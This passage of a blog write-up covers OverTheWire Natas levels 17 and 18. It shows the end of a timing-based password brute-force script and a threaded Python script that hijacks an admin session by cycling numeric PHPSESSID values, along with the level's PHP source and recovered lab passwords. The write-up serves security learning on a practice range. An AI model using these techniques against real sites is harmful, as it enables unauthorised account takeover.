+        <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">end</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">end</span><span class="o">-</span><span class="n">start</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">:</span>
+            <span class="n">bruteforced</span> <span class="o">=</span> <span class="n">bruteforced</span> <span class="o">+</span> <span class="n">char</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Current password: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">bruteforced</span><span class="p">)</span>
+            <span class="n">index</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="n">still_forcing</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">still_forcing</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">return</span> <span class="n">bruteforced</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">filtered_chars</span> <span class="o">=</span> <span class="n">get_filtered_chars</span><span class="p">()</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">brute_force_password</span><span class="p">(</span><span class="n">filtered_chars</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;**** PASSWORD DISCOVERED ***&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And finally the password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">**** PASSWORD DISCOVERED ***
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="natas18">natas18</h2>
+<p>Starting this off by going to: <a href="http://natas18.natas.labs.overthewire.org/">http://natas18.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas18
+Pass: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+</code></pre></td></tr></table>
+</div>
+</div><p>Yet another login challenge, except this time logging in as the <code>Admin</code> is required to get the password for <code>natas19</code>.</p>
+<p>Since the source is available, it&rsquo;s worth looking over to see what&rsquo;s going on:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
+<span class="nv">$maxid </span><span class="o">=</span> <span class="mi">640</span><span class="p">;</span> <span class="c1">// 640 should be enough for everyone
+</span><span class="c1"></span><span class="k">function</span> <span class="nf">isValidAdminLogin</span><span class="p">()</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* This method of authentication appears to be unsafe and has been disabled for now. */</span>
+        <span class="c1">//return 1;
+</span><span class="c1"></span>    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">isValidID</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">return</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">createID</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">global</span> <span class="nv">$maxid</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$maxid</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">print</span> <span class="s2">&#34;DEBUG: </span><span class="si">$msg</span><span class="s2">&lt;br&gt;&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">my_session_start</span><span class="p">()</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="k">and</span> <span class="nx">isValidID</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">session_start</span><span class="p">())</span> <span class="p">{</span>
+        <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Session start failed&#34;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Session start ok&#34;</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Session was old: admin flag set&#34;</span><span class="p">);</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;admin&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// backwards compatible, secure
+</span><span class="c1"></span>        <span class="p">}</span>
+        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION and array_key_exists</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;admin&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s2">&#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;</span><span class="p">;</span>
+    <span class="k">print</span> <span class="s2">&#34;&lt;pre&gt;Username: natas19</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="k">print</span> <span class="s2">&#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s2">&#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="nv">$showform </span><span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">my_session_start</span><span class="p">())</span> <span class="p">{</span>
+    <span class="nx">print_credentials</span><span class="p">();</span>
+    <span class="nv">$showform </span><span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;username&#34;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nx">session_id</span><span class="p">(</span><span class="nx">createID</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]));</span>
+    <span class="nx">session_start</span><span class="p">();</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;admin&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">isValidAdminLogin</span><span class="p">();</span>
+    <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;New session started&#34;</span><span class="p">);</span>
+    <span class="nv">$showform </span><span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+    <span class="nx">print_credentials</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$showform</span><span class="p">)</span> <span class="p">{</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This time around things are quite a bit simpler. It looks like there&rsquo;s a possibility of 640 ids:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">$maxid = 640; // 640 should be enough for everyone
+</code></pre></td></tr></table>
+</div>
+</div><p>This challenge seems to focus on the idea of <a href="https://en.wikipedia.org/wiki/Session_hijacking" target="_blank" rel="noopener noreffer">session hijacking</a>. These IDs are used to determine what session ID is currently active and then either use the active session or create a new one. In this particular case, the goal is to find the active <code>Admin</code> session since it&rsquo;ll be the only way to get the password for this challenge.</p>
+<p>Python to the rescue here, this time using python3, requests, and some concurrency (since iterating through 640 session ID can take a bit of time):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
+<span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://natas18.natas.labs.overthewire.org/index.php?debug&#34;</span>
+<span class="n">USER</span> <span class="o">=</span> <span class="s2">&#34;natas18&#34;</span>
+<span class="n">PASSW</span> <span class="o">=</span> <span class="s2">&#34;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&#34;</span>
+<span class="n">POOL</span> <span class="o">=</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">build_requests</span><span class="p">():</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">640</span><span class="p">):</span>
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">}</span>
+        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)}</span>
+        <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="n">USER</span><span class="p">,</span> <span class="n">PASSW</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;auth&#34;</span><span class="p">:</span> <span class="n">auth</span><span class="p">,</span> <span class="s2">&#34;cookies&#34;</span><span class="p">:</span> <span class="n">cookies</span><span class="p">,</span> <span class="s2">&#34;params&#34;</span><span class="p">:</span> <span class="n">params</span><span class="p">})</span>
+<span class="k">return</span> <span class="n">req</span>
+
+<span class="k">def</span> <span class="nf">request_sessions</span><span class="p">(</span><span class="n">req</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">URL</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">req</span><span class="p">[</span><span class="s2">&#34;auth&#34;</span><span class="p">],</span>
+    <span class="n">cookies</span><span class="o">=</span><span class="n">req</span><span class="p">[</span><span class="s2">&#34;cookies&#34;</span><span class="p">],</span> <span class="n">params</span><span class="o">=</span><span class="n">req</span><span class="p">[</span><span class="s2">&#34;params&#34;</span><span class="p">])</span>
+<span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">urls</span> <span class="o">=</span> <span class="n">build_requests</span><span class="p">()</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">POOL</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">request_sessions</span><span class="p">,</span> <span class="n">urls</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s2">&#34;You are an admin.&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>After letting that run for a bit and printing out the contents of the page on matching the &ldquo;You are an admin.&rdquo; string:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+DEBUG: Session start ok<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>You are an admin. The credentials for the next level are:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>Username: natas19
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-06-14&nbsp;<i class="fas fa-hashtag fa-fw"></i>79f870f</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://noopz.github.io/natas_challenges_part3/" data-title="Natas Challenges (part 3)" data-hashtags="OTW,natas,wargames"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://noopz.github.io/natas_challenges_part3/" data-hashtag="OTW"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/otw/">OTW</a>,&nbsp;<a href="/tags/natas/">natas</a>,&nbsp;<a href="/tags/wargames/">wargames</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/plex_aac_atfv_fix/" class="prev" rel="prev" title="Fixing AAC Playback with Amazon FireTV (Gen1)"><i class="fas fa-angle-left fa-fw"></i>Fixing AAC Playback with Amazon FireTV (Gen1)</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Zack</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">cc by-nc 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{},"cookieconsent":{"content":{"allow":"Allow cookies","deny":"Decline","dismiss":"Allow cookies","link":"Learn more","message":"Hey, this site uses cookies."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"revokable":false,"theme":"edgeless","type":"info"},"gtagConfig":{"anonymize_ip":false,"enable":true,"tracking_id":"UA-168052344-1"}};</script><script type="text/javascript" src="/js/theme.min.cb3f77989212bebcd498d8b441c555574e00a1a1250508a430cf215c9f45bef736e721d5005ef144b47b2cd3997c2175c03977c50086fe4016eab32a8fe118b6.js" integrity="sha512-yz93mJISvrzUmNi0QcVVV04AoaElBQikMM8hXJ9Fvvc25yHVAF7xRLR7LNOZfCF1wDl3xQCG/kAW6rMqj&#43;EYtg=="></script>
+</body>
+</html>
